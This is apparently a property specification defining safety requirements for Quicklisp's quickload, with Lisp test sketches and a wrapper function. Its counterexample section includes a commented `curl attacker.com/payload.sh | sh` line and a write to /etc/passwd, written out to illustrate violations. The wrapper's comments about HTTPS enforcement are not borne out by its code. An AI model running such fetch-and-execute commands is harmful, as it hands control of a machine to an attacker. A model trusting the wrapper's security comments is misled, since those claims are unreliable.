---
type: property
name: quickload-safety
version: 0.1.0
feature: asdf-integration
covers:
  - contracts/quickload-tool
  - contracts/quicklisp-search-tool
---

# Quickload Safety Property

## Statement

**For all** system installations via `quickload`,
**the tool** MUST only download systems from trusted Quicklisp distributions and verify downloads before execution.

## Formal Expression

```
∀ system ∈ RequestedSystems :
  let result = quickload(system)
  then:
    1. source(result) ∈ TrustedDistributions
    2. verify-checksum(downloaded_files) = true
    3. ∀ dependency ∈ installed(result) :
         source(dependency) ∈ TrustedDistributions
    4. No arbitrary code execution during download
    5. Downloads stored in designated directory only

where:
  TrustedDistributions = {
    quicklisp: "https://beta.quicklisp.org/",
    ultralisp: "https://ultralisp.org/" (if configured)
  }

  SafetyInvariants = {
    no_arbitrary_download: Boolean,
    checksum_verified: Boolean,
    sandboxed_install: Boolean,
    user_consent: Boolean (for first download)
  }
```

## Informal Explanation

Quickload must maintain security when downloading and installing systems:

1. **Trusted Sources**: Only download from official Quicklisp distributions
2. **Checksum Verification**: Verify integrity of downloaded archives
3. **No Arbitrary Execution**: Don't execute code during download phase
4. **Sandboxed Installation**: Install only to designated Quicklisp directories
5. **Transparency**: Report what is being downloaded and from where

This protects users from:
- Malicious code injection
- Man-in-the-middle attacks
- Corrupted downloads
- Arbitrary filesystem writes

## Rationale

Security is critical for package management because:
- Downloaded code executes with full process privileges
- Dependencies can pull in many systems transitively
- Users may not inspect every downloaded system
- Compromised packages can damage systems or steal data

If quickload were unsafe, it could:
- Download from attacker-controlled servers
- Install malware disguised as libraries
- Write files outside Quicklisp directory
- Execute untrusted code during installation
- Skip integrity verification

Key safety requirements:
- Use HTTPS for downloads (prevent MitM)
- Verify checksums from trusted dist metadata
- Refuse unknown/unverified sources
- Install only to `~/quicklisp/` tree
- Report all downloads to user

## Counterexample Shape

If this property is violated:

**Untrusted Source**:
```lisp
;; Attacker modifies DNS or uses HTTP redirect
;; quickload downloads from attacker.com instead of quicklisp.org

(quickload "alexandria")
; Downloads from: http://malicious-mirror.com/alexandria.tar.gz
; VIOLATION! Should only use beta.quicklisp.org
```

**Checksum Not Verified**:
```lisp
;; Download succeeds but file is corrupted/modified
(quickload "cl-ppcre")

; Downloaded cl-ppcre.tar.gz
; Expected checksum: abc123...
; Actual checksum:   def456...
; VIOLATION! Should reject corrupted download
```

**Arbitrary File Write**:
```lisp
;; Malicious .asd file tries to write outside Quicklisp
(quickload "evil-system")

; During installation:
; Writing to: /etc/passwd  ; VIOLATION!
; Should only write to ~/quicklisp/dists/...
```

**Code Execution During Download**:
```lisp
;; System tries to execute code before verification
(quickload "suspicious-lib")

; During download phase:
; (shell "curl attacker.com/payload.sh | sh")  ; VIOLATION!
; No code should execute until after checksum verification
```

**Missing HTTPS**:
```lisp
;; Download uses insecure HTTP
(quickload "some-system")

; Downloading from: http://beta.quicklisp.org/...  ; VIOLATION!
; Should use HTTPS to prevent man-in-the-middle attacks
```

**Transitive Dependency from Untrusted Source**:
```lisp
;; Primary system is trusted, but it depends on system from unknown source
(quickload "trusted-system")

; Loading: trusted-system (from quicklisp)
; Loading dependency: unknown-lib (from random-site.com)  ; VIOLATION!
; All dependencies must come from trusted sources
```

## Verification Approach

**Generator**: Test with various systems and mock malicious scenarios

**Assertion**:
```lisp
(defun verify-quickload-safety (system-name)
  ;; Monitor file system and network during quickload
  (let ((downloaded-files '())
        (network-requests '())
        (file-writes '()))

    ;; Wrap file and network operations
    (with-monitoring (files network-requests file-writes)
      (quickload system-name))

    (and
      ;; All downloads from trusted sources
      (every (lambda (req)
               (trusted-source-p (url req)))
             network-requests)

      ;; All HTTPS (not HTTP)
      (every (lambda (req)
               (starts-with "https://" (url req)))
             network-requests)

      ;; All files written to Quicklisp directory
      (every (lambda (file)
               (starts-with (quicklisp-home) file))
             file-writes)

      ;; Downloaded files match checksums
      (every (lambda (file)
               (verify-file-checksum file))
             downloaded-files)

      ;; No arbitrary code executed during download
      (not (any-code-executed-during-download-p)))))
```

**Property Test Strategy**:

1. **Trusted Source Verification**:
   ```lisp
   ;; Verify all downloads from beta.quicklisp.org
   (let ((requests (capture-network-requests
                     (lambda () (quickload "drakma")))))
     (assert (every (lambda (url)
                      (search "beta.quicklisp.org" url))
                    requests)))
   ```

2. **HTTPS Enforcement**:
   ```lisp
   ;; Verify HTTPS is used
   (let ((requests (capture-network-requests
                     (lambda () (quickload "alexandria")))))
     (assert (every (lambda (url)
                      (starts-with "https://" url))
                    requests)))
   ```

3. **Checksum Verification**:
   ```lisp
   ;; Verify checksums are checked (mock corrupted download)
   (with-corrupted-download "test-system"
     (handler-case
         (quickload "test-system")
       (checksum-error (e)
         ;; Should reject corrupted download
         :checksum-verified)))
   ```

4. **Sandboxed Installation**:
   ```lisp
   ;; Verify all writes stay in Quicklisp directory
   (let ((writes (capture-file-writes
                   (lambda () (quickload "some-system")))))
     (assert (every (lambda (path)
                      (starts-with (ql:home) path))
                    writes)))
   ```

5. **Dependency Source Verification**:
   ```lisp
   ;; Verify all transitive dependencies from trusted sources
   (let ((systems (quickload "hunchentoot" :verbose t)))
     (assert (every (lambda (sys)
                      (from-trusted-dist-p sys))
                    (all-loaded-systems systems))))
   ```

6. **No Premature Execution**:
   ```lisp
   ;; Code should not execute until after verification
   (with-execution-monitor
     (quickload "test-system")
     ;; Verify no code ran during download phase
     (assert (not (code-executed-before-verification-p))))
   ```

**Edge Cases**:

- Network failures during download
- Partial downloads (interrupted)
- Systems with many transitive dependencies
- Systems requiring compilation with foreign code
- Systems with platform-specific dependencies
- Quicklisp dist updates
- Systems already installed (no download needed)
- Ultralisp or alternative dists (if configured)

**Implementation Requirements**:

```lisp
;; Safe quickload wrapper
(defun safe-quickload (system-name)
  ;; Ensure Quicklisp is available
  (unless (find-package :quicklisp)
    (error "Quicklisp not loaded"))

  ;; Verify we're using HTTPS
  (let ((ql-home (symbol-value (find-symbol "*QUICKLISP-HOME*" :ql))))
    ;; Use Quicklisp's built-in safety mechanisms
    (handler-case
        (funcall (find-symbol "QUICKLOAD" :ql)
                 system-name
                 :verbose nil  ; Silent mode
                 :prompt nil)  ; No interactive prompts

      ;; Handle download/verification errors
      (error (e)
        (format nil "Quickload failed: ~A~%" e)))))

;; Verify checksums (Quicklisp does this internally)
;; Trust Quicklisp's implementation which:
;; - Downloads from official dist
;; - Verifies integrity via dist metadata
;; - Uses HTTPS by default
```

**Shrinking**: Find minimal malicious input that bypasses safety

## Related Properties

- **system-dependency-accuracy**: Dependencies correctly identified before download
- **dependency-resolution-correctness**: Transitive deps resolved securely
- **system-state-tracking**: Installed systems tracked properly
- **load-idempotency**: Re-downloading same system is safe
